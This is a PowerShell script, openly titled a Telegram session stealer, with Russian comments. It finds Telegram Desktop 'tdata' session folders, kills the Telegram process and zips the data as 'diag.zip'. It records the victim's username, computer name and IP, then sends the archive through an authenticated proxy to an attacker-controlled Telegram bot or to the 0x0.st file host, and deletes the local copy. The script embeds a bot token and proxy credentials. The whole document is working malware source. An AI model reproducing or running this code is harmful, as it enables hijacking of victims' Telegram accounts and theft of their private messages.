# ============================================================
# Telegram Session Stealer + 0x0.st + Proxy (407 fix)
# ============================================================

$botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
$chatId   = "8620709143"

# Прокси с явной авторизацией
$proxy = New-Object System.Net.WebProxy("http://gate.proxydata.ru:3129", $true)
$proxy.Credentials = New-Object System.Net.NetworkCredential("user-xpx93ax5", "5pxp942ldb7jtnh2")

function Send-TelegramMessage {
    param($text)
    $url = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{ chat_id = $chatId; text = $text } | ConvertTo-Json
    $wc = New-Object System.Net.WebClient
    $wc.Proxy = $proxy
    $wc.Headers.Add("Content-Type", "application/json")
    $wc.UploadString($url, "POST", $body) | Out-Null
}

function Upload-To0x0 {
    param($filePath)
    $wc = New-Object System.Net.WebClient
    $wc.Proxy = $proxy
    $response = $wc.UploadFile("https://0x0.st", "POST", $filePath)
    return [System.Text.Encoding]::UTF8.GetString($response).Trim()
}

try {
    # 1. Поиск tdata
    $paths = @()
    @("$env:APPDATA\Telegram Desktop\tdata", "$env:APPDATA\Telegram Desktop Beta\tdata") | ForEach-Object {
        if (Test-Path $_) { $paths += $_ }
    }
    if ($paths.Count -eq 0) {
        Send-TelegramMessage "❌ tdata not found"
        exit
    }

    # 2. Завершаем Telegram
    Get-Process -Name Telegram -ErrorAction SilentlyContinue | Stop-Process -Force

    # 3. Архивация
    $zip = "$env:TEMP\diag.zip"
    Compress-Archive -Path $paths -DestinationPath $zip -Force

    # 4. Сбор информации
    $user = $env:USERNAME
    $comp = $env:COMPUTERNAME
    $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -Proxy $proxy).Content.Trim()
    $caption = "$user@$comp | IP: $ip"

    $size = (Get-Item $zip).Length

    # 5. Отправка
    if ($size -gt 52428800) {
        $link = Upload-To0x0 -filePath $zip
        Send-TelegramMessage "$caption`nDownload: $link"
    } else {
        $bytes = [System.IO.File]::ReadAllBytes($zip)
        $boundary = "---------------------------$([DateTime]::Now.Ticks.ToString('x'))"
        $multipart = @()
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="chat_id"'
        $multipart += ""
        $multipart += $chatId
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="document"; filename="diag.zip"'
        $multipart += 'Content-Type: application/zip'
        $multipart += ""
        $multipart += [System.Text.Encoding]::ASCII.GetString($bytes)
        $multipart += "--$boundary--"
        $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
        $url = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId&caption=$caption"
        $wc = New-Object System.Net.WebClient
        $wc.Proxy = $proxy
        foreach ($key in $headers.Keys) { $wc.Headers.Add($key, $headers[$key]) }
        $data = [System.Text.Encoding]::UTF8.GetBytes(($multipart -join "`r`n"))
        $wc.UploadData($url, "POST", $data) | Out-Null
    }

    # 6. Удаляем архив
    Remove-Item $zip -Force -ErrorAction SilentlyContinue
    Send-TelegramMessage "✅ Done"

} catch {
    Send-TelegramMessage "❌ Error: $($_.Exception.Message)"
}
